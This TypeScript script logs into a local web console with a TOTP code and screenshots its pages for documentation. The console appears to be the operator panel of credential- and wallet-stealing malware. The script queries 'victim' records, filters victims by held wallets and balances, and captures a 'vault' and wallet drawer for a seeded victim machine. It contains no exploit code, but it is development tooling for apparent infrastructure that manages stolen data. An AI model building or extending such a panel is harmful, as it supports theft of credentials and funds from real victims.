import { chromium } from 'playwright-core';
import { authenticator } from 'otplib';
import { PrismaClient } from '@prisma/client';

async function main() {
  const prisma = new PrismaClient();
  const admin = await prisma.operator.findUniqueOrThrow({ where: { email: 'admin@spc.local' } });
  const victim = await prisma.victim.findFirstOrThrow({ where: { hostname: 'SEED-DESKTOP' } });
  await prisma.$disconnect();
  const login = await fetch('http://127.0.0.1:4000/api/console/auth/login', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: 'admin@spc.local', password: 'screenshot-pass', totp: authenticator.generate(admin.totpSecret) })
  });
  if (!login.ok) throw new Error(await login.text());
  const cookie = login.headers.get('set-cookie')!.split(';')[0]!;
  const [name, value] = cookie.split('=');

  for (const [label, url] of [['logs', '/logs?level=info'], ['logs-error', '/logs?level=error'], ['events', '/events'], ['vault', '/vault']] as const) {
    const res = await fetch(`http://127.0.0.1:3000${url}`, { headers: { cookie }, redirect: 'manual' });
    console.log(label, res.status);
  }
  const api = (path: string) => fetch(`http://127.0.0.1:4000/api/console${path}`, { headers: { cookie } }).then(async (res) => {
    const body = await res.text();
    return { status: res.status, body: body.slice(0, 180) };
  });
  console.log('logs api', await api('/logs?level=error&limit=2'));
  console.log('logs redacted', await api('/logs?q=token&limit=1'));
  console.log('has filter', await api(`/victims?has=wallets&limit=5`));
  console.log('has empty', await api(`/victims?has=balances&limit=5`));

  const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true });
  const context = await browser.newContext({ viewport: { width: 1600, height: 1000 }, deviceScaleFactor: 1 });
  await context.addCookies([{ name: name!, value: value!, url: 'http://127.0.0.1:3000' }]);
  const page = await context.newPage();
  const shot = async (path: string) => { await page.waitForTimeout(900); await page.screenshot({ path: `../docs/ui/${path}` }); };

  await page.goto('http://127.0.0.1:3000/logs?level=info', { waitUntil: 'networkidle' });
  await shot('after-logs.png');
  await page.goto('http://127.0.0.1:3000/events', { waitUntil: 'networkidle' });
  await shot('after-events.png');
  await page.goto('http://127.0.0.1:3000/vault', { waitUntil: 'networkidle' });
  await shot('after-vault.png');
  await page.goto(`http://127.0.0.1:3000/victims?select=${victim.id}`, { waitUntil: 'networkidle' });
  await shot('after-victim-resumen.png');
  await page.goto(`http://127.0.0.1:3000/victims?select=${victim.id}&tab=boveda`, { waitUntil: 'networkidle' });
  await shot('after-victim-boveda.png');
  const group = page.locator('section button').first();
  if (await group.count()) await group.click();
  await page.waitForTimeout(400);
  const wallet = page.locator('section .divide-y button').first();
  if (await wallet.count()) { await wallet.click(); await page.waitForTimeout(500); }
  await page.screenshot({ path: '../docs/ui/after-vault-drawer.png' });
  await page.keyboard.press('Escape');
  await page.goto(`http://127.0.0.1:3000/victims?select=${victim.id}&tab=actividad`, { waitUntil: 'networkidle' });
  await shot('after-victim-actividad.png');
  await page.setViewportSize({ width: 390, height: 850 });
  await page.goto(`http://127.0.0.1:3000/victims?select=${victim.id}`, { waitUntil: 'networkidle' });
  await shot('after-mobile.png');
  await browser.close();
}
main().catch((error) => { console.error(error); process.exit(1); });
